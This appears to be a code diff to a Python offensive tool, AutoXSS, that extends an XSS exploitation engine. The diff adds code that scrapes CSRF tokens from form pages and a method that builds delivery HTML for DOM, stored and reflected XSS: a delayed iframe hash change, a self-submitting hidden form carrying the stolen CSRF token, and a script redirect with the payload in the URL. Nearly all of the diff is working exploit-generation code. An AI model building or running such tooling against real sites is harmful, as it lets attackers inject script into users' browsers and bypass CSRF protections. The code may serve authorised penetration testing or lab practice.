@@ -29,12 +29,15 @@ class AutoXSS:
     """Automated XSS detection and exploitation engine."""
 
     def __init__(self, base_url: str, param: str = "q",
-                 method: str = "GET", session=None, headers: dict = None):
+                 method: str = "GET", session=None, headers: dict = None,
+                 csrf_url: str = ""):
         self.base_url = base_url
         self.param = param
         self.method = method.upper()
         self.session = session or _get_session()
         self.extra_headers = headers or {}
+        self.csrf_url = csrf_url  # URL to GET for CSRF token extraction
+        self.csrf_token = ""
         self.context = None
         self.payloads_tested = []
         self.vulnerable = False
@@ -89,6 +92,45 @@ class AutoXSS:
             encodings["js_encoding"] = True
 
         return encodings
+
+    def _extract_csrf(self):
+        """Extract CSRF token from form page."""
+        try:
+            resp = self.session.get(self.csrf_url, timeout=10)
+            match = re.search(r'name="csrf"[^>]*value="([^"]+)"', resp.text)
+            if match:
+                self.csrf_token = match.group(1)
+        except Exception:
+            pass
+
+    def generate_exploit_html(self, payload: str, xss_type: str = "reflected") -> str:
+        """Generate exploit HTML for delivering XSS payload.
+
+        Args:
+            payload: The XSS payload to deliver
+            xss_type: 'reflected', 'stored', 'dom_hashchange'
+        """
+        if xss_type == "dom_hashchange":
+            # DOM XSS via jQuery hashchange: iframe + delayed hash change
+            return (
+                f'<iframe id="f" src="{self.base_url}"></iframe>'
+                f'<script>setTimeout(function(){{'
+                f'document.getElementById("f").src="{self.base_url}#{payload}";'
+                f'}},3000);</script>'
+            )
+        elif xss_type == "stored":
+            # Stored XSS: auto-submit form with payload
+            return (
+                f'<form id="f" action="{self.base_url}" method="POST">'
+                f'<input type="hidden" name="csrf" value="{self.csrf_token}">'
+                f'<input type="hidden" name="{self.param}" value="{payload}">'
+                f'</form>'
+                f'<script>document.getElementById("f").submit();</script>'
+            )
+        else:
+            # Reflected XSS: direct URL with payload
+            from urllib.parse import quote
+            return f'<script>location="{self.base_url}?{self.param}={quote(payload)}";</script>'
 
     def detect_context(self) -> str:
         """Detect where user input appears in the response."""
